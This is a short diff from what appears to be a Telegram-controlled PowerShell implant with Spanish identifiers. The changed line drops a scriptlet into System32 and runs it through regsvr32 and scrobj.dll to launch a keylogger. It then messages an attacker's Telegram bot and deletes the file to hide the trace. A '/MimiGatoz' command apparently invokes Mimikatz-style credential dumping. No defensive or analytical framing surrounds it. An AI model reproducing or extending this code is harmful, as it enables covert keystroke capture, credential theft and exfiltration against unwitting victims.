@@ -283,7 +283,7 @@ classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
     <method name="Exec"></method>
 </public>
 </scriptlet>'
-$plantilla_sct | Out-File -Encoding ascii "C:\windows\system32\log.sct"  ; Start-Process  'c:\windows\system32\regsvr32.exe' -ArgumentList '/s /n /u /i:c:\windows\system32\log.sct scrobj.dll' ;$texto = "Lanzado Keylogger_Selective $comando" ; envia-mensaje -text $texto -botkey $botkey -chat $chat_id; Remove-Item C:\Windows\System32\log.sct }
+$plantilla_sct | Out-File -Encoding ascii "C:\windows\system32\log.sct"  ; IEX  'c:\windows\system32\regsvr32.exe /s /n /u /i:c:\windows\system32\log.sct scrobj.dll' ;$texto = "Lanzado Keylogger_Selective $comando" ; envia-mensaje -text $texto -botkey $botkey -chat $chat_id; Remove-Item C:\Windows\System32\log.sct }
  if ($comando -like "/MimiGatoz") {mimigatoz}
 
 }
